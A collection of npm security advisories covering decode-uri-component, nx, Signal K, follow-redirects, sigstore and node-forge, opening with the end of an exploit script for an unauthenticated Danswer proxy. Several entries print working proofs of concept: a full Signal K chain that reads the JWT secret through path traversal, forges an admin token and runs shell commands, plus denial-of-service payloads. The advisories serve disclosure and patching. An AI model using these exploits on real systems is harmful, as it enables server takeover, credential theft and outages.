    python3 poc.py [proxy_host] [proxy_port]
    Default: 127.0.0.1  3000
"""

import json
import socket
import sys
import time

import requests

# ── Configuration ──────────────────────────────────────────────────────────────
PROXY_HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PROXY_PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 3000
PROXY_BASE = f"http://{PROXY_HOST}:{PROXY_PORT}"

# Attacker-chosen admin-only endpoint — no credentials sent by the client.
ATTACK_PATH    = "/_v1_da/admin/users/delete"
ATTACK_PAYLOAD = {"id": "victim-user-123"}


# ── Helpers ────────────────────────────────────────────────────────────────────
def wait_for_port(host: str, port: int, timeout: int = 40) -> bool:
    """Return True when a TCP connection succeeds within *timeout* seconds."""
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        try:
            with socket.create_connection((host, port), timeout=1):
                return True
        except OSError:
            time.sleep(1)
    return False


def run_exploit() -> bool:
    print("=" * 64)
    print("VULN-001 PoC — Unauthenticated Danswer API Confused Deputy Proxy")
    print("=" * 64)
    print(f"[*] Proxy base   : {PROXY_BASE}")
    print(f"[*] Attack path  : {ATTACK_PATH}")
    print(f"[*] Attack body  : {json.dumps(ATTACK_PAYLOAD)}")
    print(f"[*] No client auth headers will be sent.")
    print()

    # Wait for the proxy server to accept connections.
    print(f"[*] Waiting for proxy on {PROXY_HOST}:{PROXY_PORT} ...")
    if not wait_for_port(PROXY_HOST, PROXY_PORT, timeout=40):
        print("[-] Proxy did not become reachable within 40 s. FAIL.")
        return False
    print("[+] Proxy is reachable.")

    # Additional brief wait to let the Node event loop fully initialise.
    time.sleep(1)

    # Send the exploit request — zero client-side authentication.
    exploit_url = f"{PROXY_BASE}{ATTACK_PATH}"
    print(f"[*] Sending unauthenticated POST → {exploit_url}")
    try:
        resp = requests.post(
            exploit_url,
            json=ATTACK_PAYLOAD,
            headers={"Content-Type": "application/json"},
            timeout=20,
        )
    except requests.exceptions.RequestException as exc:
        print(f"[-] HTTP request failed: {exc}")
        return False

    print(f"[*] HTTP status : {resp.status_code}")
    print(f"[*] HTTP body   : {resp.text[:800]}")
    print()

    # Parse the echo from the mock Danswer server.
    try:
        body = resp.json()
    except ValueError:
        print("[-] Response is not valid JSON — cannot verify exploit. FAIL.")
        return False

    auth_header = body.get("authorization") or ""
    upstream_url = body.get("url") or ""
    method = body.get("method") or ""

    print("[*] Fields echoed by mock Danswer upstream:")
    print(f"    method        : {method!r}")
    print(f"    url           : {upstream_url!r}")
    print(f"    authorization : {auth_header!r}")
    print()

    # Decisive evidence criteria:
    #   1. Attacker-supplied path reached the upstream server.
    #   2. Server-side API key was attached without any client credential.
    #   3. Attacker-supplied HTTP method was forwarded.
    path_proxied   = "/api/admin/users/delete" in upstream_url
    cred_attached  = "Bearer supersecret" in auth_header
    method_correct = method == "POST"

    if path_proxied and cred_attached and method_correct:
        print("[+] === EXPLOIT CONFIRMED — PASS ===")
        print("[+] Decisive evidence:")
        print(f"    1. Attacker-controlled path reached upstream : url={upstream_url!r}")
        print(f"    2. Server-side API key forwarded (no client auth) : authorization={auth_header!r}")
        print(f"    3. Attacker-controlled HTTP method forwarded : method={method!r}")
        return True
    else:
        print("[-] === EXPLOIT NOT CONFIRMED — FAIL ===")
        if not path_proxied:
            print(f"    MISSING: /api/admin/users/delete not found in url={upstream_url!r}")
        if not cred_attached:
            print(f"    MISSING: 'Bearer supersecret' not found in authorization={auth_header!r}")
        if not method_correct:
            print(f"    MISSING: expected method=POST, got {method!r}")
        return False


if __name__ == "__main__":
    success = run_exploit()
    sys.exit(0 if success else 1)
```

### GHSA-qr28-fpjm-wq7f — decode-uri-component vulnerable to denial of service via quadratic replacement of percent-encoded runs
- Aliases: CVE-2026-118664 | Published: 2026-10-29 | Modified: 2026-10-29 | Severity: HIGH
- CWE: CWE-400, CWE-407
- CVSS_V4: `CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N`
- Affected npm/decode-uri-component: introduced:0 fixed:0.5.1

### Summary

`decodeUriComponent()` takes quadratic time on malformed input that has many distinct percent-encoded runs. A single unauthenticated request of about 224 KB can block the Node.js event loop for about 20 seconds. Version 0.5.0, the release that fixed CVE-2026-45822, is affected.

### Details

When native decodeURIComponent throws, `decodeUriComponent()` falls back to `customDecodeURIComponent` (`index.js:122`). That function:
1. Scans the input for every run of percent-encoded bytes (e.g. `%C3%A5`) and stores each distinct run, with its decoded value, in a lookup table (`index.js:130-144`).
2. Runs one full-string `input.replace(new RegExp(key, 'g'), …)` per table entry (`index.js:154`).

With K distinct runs in an input of length L, that's K regex compilations and K full scans of the string, so O(K·L). An attacker controls both K and L, and K grows with L. One malformed sequence such as a trailing `%zz` is enough to force the fallback path.

The 0.5.0 fix for CVE-2026-45822 (`fa479da`) replaced the recursive `decode()` routine with a linear scanner, but left this replacement loop unchanged.

### Proof of concept

Running the following code takes ~20 seconds.

```js
import decodeUriComponent from 'decode-uri-component';

let payload = '';
for (let i = 0; i < 32000; i++) {
	const high = Math.floor(i / 256).toString(16).padStart(2, '0');
	const low = (i % 256).toString(16).padStart(2, '0');
	payload += `%${high}%${low}x`; // distinct run each iteration
}
payload += '%zz'; // forces the fallback decoder

console.time('decode');
decodeUriComponent(payload); // ~224 KB
console.timeEnd('decode');
```

### Impact

This is an availability issue only and there's no confidentiality or integrity impact. Any application that passes untrusted input to `decodeUriComponent()`, directly or through a dependency such as `query-string`, can be made unresponsive. Because Node.js runs on one thread, one request stalls every other client.

The worst case needs input well beyond URL length limits. Node's default 16 KB header limit keeps payloads passed in via a URL query string to roughly 40 ms per request. Applications that decode request bodies are fully exposed, for example form bodies parsed with `query-string.parse()`.

References:
- https://github.com/SamVerschueren/decode-uri-component/security/advisories/GHSA-qr28-fpjm-wq7f [WEB]
- https://nvd.nist.gov/vuln/detail/CVE-2026-118664 [ADVISORY]
- https://github.com/SamVerschueren/decode-uri-component/commit/fad01d65b93bd3f2f0dc32dfd8d57a38b57bc608 [WEB]
- https://github.com/SamVerschueren/decode-uri-component [PACKAGE]
- https://github.com/SamVerschueren/decode-uri-component/releases/tag/v0.5.1 [WEB]

### GHSA-qm8w-vx34-5j9j — @nx/maven and @nx/gradle have OS command injection via nx.json plugin options
- Aliases: CVE-2026-119282 | Published: 2026-10-30 | Modified: 2026-10-30 | Severity: HIGH
- CWE: CWE-78, CWE-88
- CVSS_V4: `CVSS:4.0/AV:L/AC:L/AT:P/PR:N/UI:P/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N`
- Affected npm/@nx/maven: introduced:22.0.2 fixed:22.7.9
- Affected npm/@nx/maven: introduced:23.0.0 fixed:23.1.2
- Affected npm/@nx/gradle: introduced:21.0.0 fixed:22.7.9
- Affected npm/@nx/gradle: introduced:23.0.0 fixed:23.1.2

## Summary

`@nx/maven` and `@nx/gradle` spawn their project-graph analyzers through a shell and interpolate plugin options read from `nx.json` straight into the command line. Because a shell parses the whole line, an option value containing shell syntax is executed as a command by any `nx` command that constructs the project graph. Anyone who clones a hostile repository, or who checks out a pull request that edits `nx.json`, runs the injected command with their own privileges.

## Severity

A victim who runs an ordinary `nx` command in an attacker-supplied Maven or Gradle workspace gets code execution as themselves. In most such workspaces an attacker who can write `nx.json` can already run code through the repository's build files (`./mvnw`, `pom.xml`, and the Gradle equivalents), so the genuinely new exposure is narrow — for example CI building a fork's pull request where `nx.json` is writable but the build files are not. We have no evidence of exploitation in the wild.

## Affected & Patched Versions

| Package | Vulnerable | Patched |
| --- | --- | --- |
| `@nx/maven` | `>= 22.0.2, < 22.7.9`; `>= 23.0.0, < 23.1.2` | `22.7.9`, `23.1.2` |
| `@nx/gradle` | `>= 21.0.0, < 22.7.9`; `>= 23.0.0, < 23.1.2` | `22.7.9`, `23.1.2` |

> [!IMPORTANT]
> Workspaces that register neither `@nx/maven` nor `@nx/gradle` in `nx.json` are unaffected — the vulnerable code only runs from those plugins' graph-construction paths, and no other Nx plugin shares this pattern.

## Remediation

Upgrade to **22.7.9** (22.x line) or **23.1.2** (23.x line) or later:

```
nx migrate 23.1.2
```

Upgrade both `nx` and the affected plugin (`@nx/maven` and/or `@nx/gradle`). The plugin's fix depends on code that ships in the `nx` package, so bumping the plugin without a matching `nx` upgrade will not resolve it.

There is no configuration to change — upgrading is the whole fix. If you cannot upgrade yet, only run `nx` commands in repositories you trust, since a malicious `nx.json` can execute code on a vulnerable version.

## Details

Both plugins spawn their analyzer through a shell and interpolate `nx.json` plugin options into the command, so those option values are shell source. For Maven the injectable value is the `targetNamePrefix` option; for Gradle it is broader, since every plugin option is mapped into a `-P` argument and arbitrary option names are accepted, making both the name and value of any option injectable.

## Credits

- **Arkadiusz Marta** (RE:SOURCE) — Reporter

- https://github.com/nrwl/nx/pull/36626 [WEB]
- https://github.com/nrwl/nx/commit/02c5d59e8dbbbe30963c0181c6a22cd8c1190a25 [WEB]

- https://github.com/nrwl/nx/commit/c227f4780b054c512965c73aa480a48f9f781409 [WEB]
- https://github.com/nrwl/nx [PACKAGE]

### GHSA-4xm8-rg9h-jhq2 — Signal K resources API path traversal can disclose the JWT signing secret and enable remote code execution
- Aliases: CVE-2026-123807 | Published: 2026-10-30 | Modified: 2026-11-09 | Severity: CRITICAL
- CWE: CWE-22
- CVSS_V3: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
- Affected npm/signalk-server: introduced:2.0.0 fixed:2.34.0
- Affected npm/@signalk/resources-provider: introduced:1.0.0 fixed:1.5.3

### Summary

Path traversal in the Signal K resources and applicationData APIs lets an
unauthenticated or low-privileged user read, write and delete files outside
the storage root. Reading <config>/security.json discloses the JWT signing
secret, enabling admin token forgery and remote code execution. 

### Details

## Description

The v2 REST resources API `GET /signalk/v2/api/resources/:resourceType/:resourceId` passes `resourceId` to `FileStore.getResource()` without validation. `getResource()` builds the file path with `path.join(this.resources[type].path, itemUuid)` followed by `readFile` + `JSON.parse`, so a `%2F`-encoded multi-level traversal (`..%2F..%2F..%2F..%2F`) escapes the resource storage directory and returns any JSON file on the server (source: `src/api/resources/index.ts:559-600`, `packages/resources-provider-plugin/src/filestorage.ts:115-125`).

Because the JWT signing secret is stored in plaintext in `<config>/security.json` (generated at `src/tokensecurity.ts:271`, persisted via `saveSecurityConfig` at `src/security.ts:377`), an unauthenticated attacker on deployments with `allow_readonly=true` (a supported, UI-toggleable configuration granting anonymous read access) can:

1. **Read `<config>/security.json`** — disclosing the JWT signing secret (512-hex) and user password hashes.
2. **Forge an admin JWT** — HS256-sign `{"id":"admin"}` with the disclosed secret; accepted by `/skServer/loginStatus` (`userLevel: "admin"`) and all admin-protected endpoints (`adminAuthenticationMiddleware`, `src/tokensecurity.ts:593`, applied at `src/tokensecurity.ts:953`).
3. **Gain remote code execution** — `POST /skServer/providers` (admin) accepts a provider of type `Execute`; `packages/streams/src/execute.ts:93` executes it via `spawn('sh', ['-c', command])` at creation time. The provider persists to `settings.json` and survives restarts.

On default deployments (`allow_readonly=false`), step 1 returns 401 to anonymous users but succeeds with any readonly user token.

## Suggested fixes

1. Validate `resourceId` against a strict whitelist (for example, UUID format) in `src/api/resources/index.ts` before any storage call, including PUT/DELETE.
2. In `FileStore.getResource/setResource/deleteResource`, canonicalise with `path.resolve()` and reject results outside `this.resources[type].path`.
3. Store the JWT signing secret outside the API-readable config directory, in a dedicated key file with mode 0600.
4. Consider gating provider types that execute commands (`Execute`) behind an explicit opt-in.

### Proof of concept

Fully local testbed. Start the server, enable `allow_readonly=true`, then run:

```python
#!/usr/bin/env python3
import base64, hashlib, hmac, json, time, urllib.request
BASE = "http://127.0.0.1:3000"
CMD  = "id > /tmp/sk-pwned"

# 1) unauthenticated traversal read of security.json
p = "/signalk/v2/api/resources/notes/..%2F..%2F..%2F..%2Fsecurity.json"
sk = json.load(urllib.request.urlopen(BASE + p))["secretKey"]

# 2) forge admin JWT
b64 = lambda b: base64.urlsafe_b64encode(b).rstrip(b"=").decode()
h = b64(json.dumps({"alg":"HS256","typ":"JWT"}).encode())
c = b64(json.dumps({"id":"admin","iat":int(time.time())}).encode())
tok = h+"."+c+"."+b64(hmac.new(sk.encode(), (h+"."+c).encode(), hashlib.sha256).digest())
req = urllib.request.Request(BASE+"/skServer/loginStatus", headers={"Authorization":"JWT "+tok})
assert json.load(urllib.request.urlopen(req))["userLevel"] == "admin"

# 3) add an Execute provider -> spawn('sh','-c',CMD)
prov = {"id":"poc-rce","enabled":True,"logging":False,"type":"Execute",
        "options":{"type":"ws","dataType":"SignalK","command":CMD}}
req = urllib.request.Request(BASE+"/skServer/providers", data=json.dumps(prov).encode(),
                             headers={"Authorization":"JWT "+tok,"Content-Type":"application/json"}, method="POST")
print(urllib.request.urlopen(req).read())    # provider created; /tmp/sk-pwned now exists
```

Reproduction verified independently on master `340d5bb6` (Node 22 / macOS), including restart persistence. PoC artifacts are available on request.

### Impact

Unauthenticated access (with `allow_readonly=true`) leads to full compromise of the server process: arbitrary JSON file read, admin takeover, arbitrary command execution with server privileges, and persistent re-execution after restart. All signalk-server releases and all published versions of the bundled/standalone resources-provider prior to 2.34.0 are affected with the patched version as 2.34.0 fix

- https://github.com/SignalK/signalk-server/commit/83689f040d7e90280dddc643f44f3e4ce348fbb1 [WEB]
- https://github.com/SignalK/signalk-server [PACKAGE]
- https://github.com/SignalK/signalk-server/releases/tag/v2.34.0 [WEB]

### GHSA-mrwp-f3q8-3g9p — follow-redirects: Cross-realm sensitiveHeaders arrays are discarded and custom credentials can follow redirects
- Aliases: CVE-2026-116689 | Published: 2026-10-30 | Modified: 2026-10-30 | Severity: HIGH
- CWE: CWE-201
- CVSS_V3: `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N`
- CVSS_V4: `CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N`
- Affected npm/follow-redirects: introduced:1.16.0 fixed:1.16.2

### Summary

follow-redirects 1.16.0 and 1.16.1 validate the documented sensitiveHeaders option with instanceof Array. An array created in another JavaScript realm is silently replaced with an empty list, so a caller-declared custom credential header can be forwarded to an attacker-controlled cross-origin redirect destination.

### Details

Affected versions

The sensitiveHeaders option was introduced in 1.16.0. Published 1.16.0 and 1.16.1 both reproduced, giving a tested affected range of 1.16.0 through 1.16.1. The source checkout was pinned at revision 46301256333c90b7faac7aa126effe72ec16d16e; the exact npm 1.16.1 artifact reproduced independently.

Root cause

index.js resets options.sensitiveHeaders when its local isArray() helper returns false. That helper uses value instanceof Array, which depends on realm identity. The same file already uses Array.isArray(options.headers), which correctly recognizes arrays across realms.

Suggested remediation

Use Array.isArray(value) for sensitiveHeaders, then validate and normalize each member as a header-name string. Add same-realm and node:vm cross-realm tests for cross-origin redirects, including the array-form headers representation. Verify that custom sensitive names are removed while unrelated headers remain unchanged.

Duplicate review

The public advisory history contains other sensitive-header findings, including array-form headers and regular-expression handling, but focused repository searches found no report describing cross-realm validation as of 2026-10-25. A private or differently worded report may already exist.

### Proof of concept

Start two loopback HTTP servers. The first returns a 302 redirect to the second. Send X-API-Key and list that name in sensitiveHeaders, then compare a normal array with a genuine cross-realm array created by:

```js
const vm = require('node:vm');
const sensitiveHeaders = vm.runInNewContext(`['X-API-Key']`);
```

Observed against both source and the exact npm 1.16.1 package:

- Same-realm ['X-API-Key']: the redirect target did not receive the key.
- Cross-realm ['X-API-Key']: Array.isArray(value) was true, value instanceof Array was false, and the redirect target received X-API-Key.
- An unrelated X-Harmless header remained present in both cases.

The complete 3.5 KB loopback-only harness and raw JSON output are available privately.

### Impact

custom credential disclosure. Exploitation requires a direct caller or wrapper that preserves a cross-realm sensitiveHeaders array, a custom credential listed in that option, and an attacker-controlled or compromised endpoint that returns a cross-origin redirect. The directly demonstrated result is disclosure of the custom header value, potentially exposing an API key or service token until revocation.

Built-in Authorization, Proxy-Authorization, and Cookie protections remained effective. Exact Axios 1.20.0 with follow-redirects 1.16.1 did not reproduce because Axios normalized the array; this report does not claim that Axios is affected. No third-party service was tested.

References:
- https://github.com/follow-redirects/follow-redirects/security/advisories/GHSA-mrwp-f3q8-3g9p [WEB]
- https://nvd.nist.gov/vuln/detail/CVE-2026-116689 [ADVISORY]
- https://github.com/follow-redirects/follow-redirects/commit/b0a7751e9cd64cd8eeb6ec67d2f206a9cc88d3f8 [WEB]
- https://github.com/follow-redirects/follow-redirects [PACKAGE]
- https://github.com/follow-redirects/follow-redirects/releases/tag/v1.16.2 [WEB]

### GHSA-j63v-mwhm-56jx — @sigstore/oci sends the registry Authorization header to a cross-host blob-upload Location
- Aliases: CVE-2026-118763 | Published: 2026-10-30 | Modified: 2026-10-30 | Severity: HIGH
- CWE: CWE-522
- CVSS_V3: `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N`
- Affected npm/@sigstore/oci: introduced:0 fixed:0.7.2

### Summary

@sigstore/oci sends the registry Authorization header to a cross-host blob-upload Location

## Affected versions and vulnerable location

- Confirmed on sigstore-js at `3a83271` (current HEAD).
- File: `packages/oci/src/registry.ts`.
  - `signIn()` installs the credential as a DEFAULT header on the shared client: `this.#fetch = this.#fetch.defaults({ headers: { [HEADER_AUTHORIZATION]: 'Basic ' + basicAuth } })` (`:126-128`) or `... 'Bearer ' + token` (`:145-147`), plus `creds.headers` from the Docker config (`:104`).
  - `uploadBlob()` reads the `Location` response header (`:184`), builds `uploadLocation = new URL(location.startsWith('/') ? this.#baseURL + location : location)` (`:190-192`), and PUTs the blob to it through the same client: `await this.#fetch(uploadLocation.href, { method: 'PUT', body: blob, headers: { [HEADER_CONTENT_TYPE]: ... } })` (`:198`).
- There is no check that `uploadLocation`'s host (or scheme) equals the registry host before the PUT is sent.

## Root cause

Because `signIn()` sets `Authorization` via `.defaults()`, it is attached to every request the client issues, including requests to a host the client read out of a server response. When a POST to `.../blobs/uploads/` returns an absolute `Location` pointing to a different host, `uploadBlob()` PUTs the blob there with the registry `Authorization` header still attached. If the challenge scheme was `basic`, that header carries the raw registry `username:password`; if bearer, it carries the access token; `creds.headers` custom auth headers ride along too.

The library's HTTP layer (`make-fetch-happen` / `minipass-fetch`) strips `Authorization` on cross-host redirects it follows internally, which protects the `HEAD ... { redirect: 'follow' }` at `:167`. It does not help here, because the PUT to the upload `Location` is a fresh, explicit `this.#fetch()` call, not a followed redirect, so the default header is applied unconditionally.

This is a residual of GHSA-pf56-329r-95rw / CVE-2026-59891 (credential confusion in `@sigstore/oci`). The fix for that advisory (commit `85c5838`) changed only `credentials.ts`, replacing a `key.includes(registry)` substring match with an exact host match when SELECTING which Docker credential to load. It never touched `registry.ts`, which controls WHERE the loaded credential is sent. The cross-host send remains.

## Attacker model

A user pushing a signed artifact/attestation to an OCI registry via `attachArtifactToImage()`. The credential leaks to any host the registry names in the blob-upload `Location`. This is reachable when the registry is malicious or compromised, or when a registry that legitimately redirects blob uploads to third-party storage is impersonated. The OCI distribution spec permits absolute upload `Location` values (registries commonly redirect blob storage to a separate host), so a compliant-but-hostile registry can steer the PUT to an attacker host and capture the credential. This is the same "attacker-controlled registry" threat model accepted for GHSA-pf56.

## Reachability trace

`index.ts:43 attachArtifactToImage()` -> `new OCIImage(...).addArtifact()` -> `image.ts:67 this.#client.signIn(credentials)` (installs the default Authorization header) -> `image.ts:76/79 this.#client.uploadBlob(...)` -> `registry.ts:198` PUT to the response-supplied `Location` with the default Authorization header attached. Same `RegistryClient` instance throughout, so the default persists.

## Reproduction

Source-verified. No live push against a hostile registry was executed in this pass. Confirmed:

```bash
rg -n "defaults\(|HEADER_AUTHORIZATION|Location|new URL\(|this.#fetch\(uploadLocation" packages/oci/src/registry.ts
git log --oneline -3 -- packages/oci/src/credentials.ts packages/oci/src/registry.ts
```

`signIn()` sets `Authorization` via `.defaults()`; `uploadBlob()` PUTs to `uploadLocation.href` (which may be an absolute cross-host URL) with no host check; the GHSA-pf56 fix commit is the latest change to `credentials.ts`, while `registry.ts` has only dependency bumps since.

## Suggested fix

Do not send the registry `Authorization` (or `creds.headers`) to an upload `Location` on a different host. Compare `uploadLocation.host` (and require `https`) against the registry host before the PUT; if it differs, issue the PUT without the credential (matching how registries that redirect to pre-signed storage URLs expect the upload to be unauthenticated), or explicitly re-authenticate for that host. More generally, avoid attaching the credential via a client-wide `.defaults()` and instead attach it per-request only to the registry host.

## How it was found and a note on tooling

Every place `@sigstore/oci` was traced to attach a credential to an outbound request and checked whether the request host can be steered by a server response. The blob-upload `Location` path attaches the client-default `Authorization` to a PUT whose host comes from the registry response, with no host-equality check, and the GHSA-pf56 fix touched only the credential-selection code, not this send path. I used AI assistance for the trace and drafting and manually verified the cited lines and the fix scope at HEAD `3a83271`. Verification is source-only; I did not execute a push against a hostile registry.

## Independent re-verification at HEAD (2026-07-31)

Re-read at HEAD `3a83271`. Unchanged, and the two halves sit in the same file:

```
126-127: this.#fetch = this.#fetch.defaults({ headers: { [HEADER_AUTHORIZATION]: `Basic ${basicAuth}` } })
145-146: this.#fetch = this.#fetch.defaults({ headers: { [HEADER_AUTHORIZATION]: `Bearer ${token}` } })
104:     this.#fetch = this.#fetch.defaults({ headers: creds.headers })
```

and in `uploadBlob()`:

```ts
const uploadLocation = new URL(
  location.startsWith('/') ? `${this.#baseURL}${location}` : location
);
...
await this.#fetch(uploadLocation.href, { method: 'PUT', ... });
```

The ternary is the whole issue. A relative `Location` is anchored to `#baseURL`, but an absolute one is
passed to `new URL()` verbatim, so its host is whatever the registry response said. There is no comparison
against the registry host or scheme before the PUT, and because the credential was installed with
`.defaults()` rather than passed per-request, it is attached automatically.

Worth separating from the redirect case: the `HEAD` at the top of `uploadBlob()` uses
`redirect: 'follow'`, and the fetch layer does strip `Authorization` across hosts on redirects it follows
itself. That protection does not apply here, because the PUT is a fresh explicit call the library makes to
a URL it parsed out of a response body header, not a redirect being followed.

This has not been executed against a hostile registry, so the leak is traced from the source rather than
observed on the wire. The control flow above is unambiguous, but it is better to state the limit than imply
a packet capture that has not been created.

References:
- https://github.com/sigstore/sigstore-js/security/advisories/GHSA-j63v-mwhm-56jx [WEB]
- https://nvd.nist.gov/vuln/detail/CVE-2026-118763 [ADVISORY]
- https://github.com/sigstore/sigstore-js/pull/1762 [WEB]
- https://github.com/sigstore/sigstore-js/commit/b855f46cfe81f26481c6d3f4b333dfd00f2fd1b1 [WEB]
- https://github.com/sigstore/sigstore-js/commit/e4ca65c3ab3c675456ab9b0bd04217ceccad3558 [WEB]
- https://github.com/sigstore/sigstore-js [PACKAGE]
- https://github.com/sigstore/sigstore-js/releases/tag/@sigstore/oci@0.7.2 [WEB]

### GHSA-5x38-2vff-x55p — Forge: X.509 basicConstraints bypass in verifyCertificateChain() via deprecated extension OIDs 2.5.29.10 and 2.5.29.13
- Aliases: CVE-2026-119190 | Published: 2026-10-30 | Modified: 2026-10-30 | Severity: HIGH
- CWE: CWE-295, CWE-436
- CVSS_V3: `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N`
- Affected npm/node-forge: introduced:0 fixed:1.4.1

### Summary
node-forge parses certificate extensions with the deprecated OIDs `2.5.29.10` and `2.5.29.13` as `basicConstraints`, and `forge.pki.verifyCertificateChain()` used the first extension with that name. A certificate with a forged deprecated-OID extension (`cA` TRUE) before its genuine `basicConstraints` extension (`cA` FALSE) is accepted as a CA certificate, and the same technique can hide a `pathLenConstraint`. Fixed in node-forge 1.4.1.

### Details
`lib/oids.js` maps the deprecated certificate extension OIDs `2.5.29.10` and `2.5.29.13` to the name `basicConstraints`, the same name as the RFC 5280 extension `2.5.29.19`. `certificateExtensionFromAsn1()` in `lib/x509.js` decodes extensions by name, so these extensions are decoded into the same `cA` and `pathLenConstraint` fields. `cert.getExtension()` returns the first extension with a matching name, and `pki.verifyCertificateChain()` looked up `basicConstraints` by name.

As a result, a certificate that contains a `2.5.29.10` (or `2.5.29.13`) extension with `cA` TRUE before its genuine `basicConstraints` extension with `cA` FALSE is accepted as a CA certificate. The same technique can hide a CA certificate's `pathLenConstraint`. A deprecated-OID extension on its own also satisfies the check added for GHSA-2328-f5f3-gj25 (CVE-2026-33896) that `basicConstraints` is present. RFC 5280 section 4.2.1.9 defines basicConstraints only as `id-ce 19` (`2.5.29.19`), and the path validation checks in section 6.1.4 apply to that extension.

The fix makes chain verification look up basicConstraints by OID (`cert.getExtension({id: '2.5.29.19'})`). This covers both the `cA` and the `pathLenConstraint` checks. Certificate parsing, the OID table and `cert.getExtension('basicConstraints')` are unchanged.

#### Patches
Fixed in node-forge 1.4.1. Chain verification now uses only the `basicConstraints` extension with OID `2.5.29.19`.

#### Workarounds
None in node-forge itself. Applications that pass an `options.verify` callback to `pki.verifyCertificateChain()` (or `verify` to `forge.tls.createConnection()`) can reject chains in which a non-leaf certificate has no `2.5.29.19` extension with `cA` TRUE, for example with `cert.getExtension({id: '2.5.29.19'})`. CA operators can avoid copying unrecognized extensions from certificate requests.

#### Credits

WorkOS Security Team· [security@workos.com](mailto:security@workos.com) (@nickcollisson-workos)

### Proof of concept
Have a trusted CA issue an end-entity certificate whose extensions are, in this order: a `2.5.29.10` (or `2.5.29.13`) extension with the value of a basicConstraints `cA` TRUE (DER `30 03 01 01 FF`), then the CA's own `2.5.29.19` basicConstraints with `cA` FALSE, and no `keyUsage`. For example, `openssl x509 -req -copy_extensions copy` with an extensions file that sets `basicConstraints = CA:FALSE` copies the extension from the CSR and produces this order. Use that certificate's key to sign a leaf certificate for any name.

On node-forge <= 1.4.0, `forge.pki.verifyCertificateChain(caStore, [leaf, eeCert])` accepts the chain, and `eeCert.getExtension('basicConstraints')` returns the `2.5.29.10` extension with `cA` true. The same certificate without the deprecated-OID extension is rejected ("Certificate basicConstraints indicates the certificate is not a CA."). A certificate with only the deprecated-OID extension is also accepted.

The fix adds regression tests in `tests/unit/x509.js` and the reporter's PoC as `tests/pocs/ghsa-5x38-2vff-x55p.js`.

### Impact
Applications that verify certificate chains with `forge.pki.verifyCertificateChain()`, including TLS peer certificate verification in `forge.tls`, are affected.

Exploitation requires a CA trusted by the application to issue a certificate that contains the attacker-supplied deprecated-OID extension, typically a CA that copies extensions from certificate signing requests. For example, `openssl x509 -req -copy_extensions copy` (or `copyall`) with an extensions file that sets `basicConstraints = CA:FALSE` and no `keyUsage` produces such a certificate. If the issuing CA adds a `keyUsage` extension without `keyCertSign`, node-forge rejects the chain.

The holder of such a certificate can then issue certificates for any name that `pki.verifyCertificateChain()` accepts. In forge's own TLS stack this allows impersonating servers (or clients, where client certificates are verified) and intercepting traffic.

- https://github.com/digitalbazaar/forge/security/advisories/GHSA-5x38-2vff-x55p [WEB]

- https://github.com/digitalbazaar/forge/commit/58c06bc251856b409c30ecb35a93f5f6c9bbc84a [WEB]

### GHSA-hqq3-7jhf-c5jx — Forge: Denial of service in TLS record processing via call stack exhaustion
- Aliases: CVE-2026-119187 | Published: 2026-10-30 | Modified: 2026-10-30 | Severity: HIGH
- CWE: CWE-674
- CVSS_V3: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`
- Affected npm/node-forge: introduced:0 fixed:1.4.1

### Summary

Connections created with `forge.tls.createConnection()` processed received TLS records recursively, one stack level per record. A peer can send one chunk of thousands of small records, such as heartbeat records, which are accepted before the handshake, and `process()` throws `RangeError: Maximum call stack size exceeded`, which terminates Node.js processes that use the documented socket wiring. Fixed in node-forge 1.4.1.

### Details

In `lib/tls.js`, `c.process()` reads one record and passes it to `_update()`, which calls the handler for the record type from `ctTable`. Every handler (`tls.handleHeartbeat`, `tls.handleApplicationData`, `tls.handleHandshake` for fragmented messages, `tls.handleHelloRequest` and the other handshake handlers) ends by calling `c.process()` again to continue with the next buffered record, or the next message in the same record. Each record therefore adds `process` → `_update` → handler to the call stack. In Node.js 24, about 2,300 eight-byte records (under 20 KB) in one chunk are enough for `process()` to throw `RangeError: Maximum call stack size exceeded`.

`ctTable` maps heartbeat records to `tls.handleHeartbeat` in every client and server state, so heartbeat records are processed before the handshake without any extension negotiation. The attack needs no authentication and no valid handshake messages. Both server connections (attacked by a client) and client connections (attacked by the server they connect to) are affected. Other record types recurse the same way: a handshake message fragmented over many records, many HelloRequest messages in one record, or many application data records after the handshake.

node-forge reports TLS protocol errors through the `error` callback, so applications do not normally wrap `process()` in `try`/`catch`. When `process()` is called from a Node.js socket `data` handler, as in the documented usage, the exception is uncaught and terminates the process. If the exception is caught, the connection is left partially processed and should be discarded.

No specification is violated; this is an implementation flaw (uncontrolled recursion).

The fix makes `c.process()` iterative. The record-reading code moves into `_processRecord()`, and `c.process()` runs it in a loop. A handler's call to `c.process()` without new data, made while records are being processed, now only flags that the loop should continue. Calls with new data are processed right away as before, so callback order and return values are unchanged.

### Patches
Fixed in node-forge 1.4.1. Records are now processed in a loop, so the stack depth no longer depends on the number of records.

### Workarounds
Wrap every call to `connection.process()` in `try`/`catch`, and on an exception close the connection (`connection.close()`) and destroy the underlying socket. This prevents the process crash but not the loss of the attacked connection.

### Credits
Reported jointly by Ziyue Wang, Chenchen, Strick Sheng, Liyi Zhou, and Maurice Ng.

### Proof of concept

Input: one chunk of N identical heartbeat records, each 8 bytes:

  18 03 01 00 03 01 00 00
  (content type 24 = heartbeat, TLS 1.0, length 3, heartbeat_request with a 0-byte payload)

  // c = forge.tls.createConnection({server: true, ...})
  var rec = forge.util.hexToBytes('1803010003010000');
  c.process(new Array(5001).join(rec)); // 5,000 records, 40,000 bytes

